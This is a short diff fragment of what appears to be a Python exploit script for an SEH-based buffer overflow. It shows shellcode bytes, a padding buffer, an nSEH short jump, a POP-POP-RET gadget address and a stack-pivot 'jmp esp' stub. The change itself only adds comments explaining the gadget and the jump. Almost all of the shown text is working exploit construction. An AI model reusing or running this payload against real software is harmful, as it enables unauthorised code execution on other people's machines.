@@ -34,8 +34,8 @@ sc += b"\x6a\xca\xef\x49\xf9\x96\xc1\xec\x79\x3c\x1e"
 
 buffer = b'/' * (3487 - len(nops) - len(sc))
 nseh = b'\xeb\x06\x90\x90'
-seh = pack('<L', 0x625012f4)
-jmp = b'\x66\x81\xC4\xDC\x05\xFF\xE4'
+seh = pack('<L', 0x625012f4) # ppr gadget
+jmp = b'\x66\x81\xC4\xDC\x05\xFF\xE4' # add sp, 0x5dc; jmp esp
 
 
 buffer2 = b'\x41' * (size - len(buffer))
